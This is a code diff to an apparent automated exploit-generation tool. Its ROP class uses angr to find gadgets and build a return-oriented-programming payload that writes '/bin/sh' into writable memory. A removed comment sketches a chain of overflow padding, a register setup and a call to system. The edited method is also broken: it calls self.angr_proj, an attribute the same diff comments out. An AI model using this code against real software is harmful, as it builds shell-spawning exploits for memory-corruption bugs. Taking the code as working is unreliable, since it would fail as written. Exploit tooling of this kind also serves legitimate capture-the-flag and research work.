@@ -16,25 +16,22 @@ class ROP:
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
         # angrop stuff
-        self.angr_proj = angr.Project(self.analysis.binary)
-        self.angr_rop  = self.angr_proj.analyses.ROP()
-        #self.angr_rop.find_gadgets_single_threaded() 
-        self.angr_rop.find_gadgets()
-        self.fart_print = Print()
+        #self.angr_proj = angr.Project(self.analysis.binary)
+        #self.angr_rop  = self.angr_proj.analyses.ROP()
+        ##self.angr_rop.find_gadgets_single_threaded() 
+        #self.angr_rop.find_gadgets()
+        #self.fart_print = Print()
 
     def write_binsh_to_mem(self):
+
+        angr_proj = angr.Project(self.analysis.binary)
+        angr_rop  = self.angr_proj.analyses.ROP()
+        #angr_rop.find_gadgets_single_threaded() 
+        angr_rop.find_gadgets()
+        fart_print = Print()
+
         self.analysis.hbsh = True
-        return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
-    
-    # TODO: genralize to account for syscall or execve
-    #def ropwrite(self, dumb=False):
-    #    chain = b'A'*self.offset
-    #    chain += self.write_binsh_to_mem()
-    #    chain += self.fill_reg("rdi", self.get_writeable_mem())
-    #    if dumb:
-    #        chain += self.realign()
-    #    chain += p64(self.analysis.elf.sym['system'])
-    #    return chain
+        return angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
     
     def build_exploit(self, failed=False):
         payload = None
